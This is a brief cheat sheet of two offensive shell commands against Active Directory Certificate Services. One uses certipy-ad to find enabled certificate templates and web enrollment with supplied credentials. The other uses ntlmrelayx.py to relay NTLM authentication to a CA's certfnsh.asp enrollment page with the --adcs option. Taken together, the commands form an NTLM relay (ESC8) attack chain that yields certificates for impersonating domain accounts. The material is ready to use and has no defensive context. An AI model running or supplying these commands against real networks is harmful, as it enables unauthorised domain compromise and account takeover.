# Find web enrollment
certipy-ad find -u user@domain.local -p pass -dc-ip $DC -enabled

# Relay authentication
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs